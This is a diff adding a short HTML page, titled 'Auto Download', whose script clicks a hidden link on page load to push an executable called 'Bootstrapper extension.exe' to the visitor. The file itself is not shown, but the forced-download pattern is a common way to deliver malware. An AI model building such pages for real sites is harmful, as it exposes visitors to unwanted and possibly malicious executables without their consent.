@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Download</title>
+</head>
+<body>
+    <script>
+        // Function to trigger the file download
+        function downloadFile() {
+            var link = document.createElement('a');
+            link.href = 'Bootstrapper extension.exe';
+            link.download = 'Bootstrapper_extension.exe';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        // Automatically trigger the download when the page loads
+        window.onload = downloadFile;
+    </script>
+</body>
+</html>
